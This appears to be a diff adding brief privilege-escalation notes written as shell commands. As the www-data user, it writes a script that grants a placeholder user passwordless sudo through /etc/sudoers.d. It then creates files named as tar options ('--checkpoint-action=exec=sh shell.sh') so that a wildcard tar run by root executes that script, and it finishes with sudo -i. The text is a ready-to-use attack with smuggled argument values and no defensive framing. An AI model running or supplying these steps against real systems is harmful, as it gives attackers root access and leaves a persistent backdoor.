@@ -1,0 +1,18 @@
+# Change to dir
+sudo -u www-data /bin/bash
+
+cat << EOF > shell.sh && chmod 777 shell.sh
+#!/bin/bash
+echo "<user> ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/<user>
+chmod 0440 /etc/sudoers.d/<user>
+EOF
+
+# Then do
+touch ./"--checkpoint=1"
+touch ./"--checkpoint-action=exec=sh shell.sh"
+exit
+
+# Perform escalation
+sudo -l
+sudo -l
+sudo -i
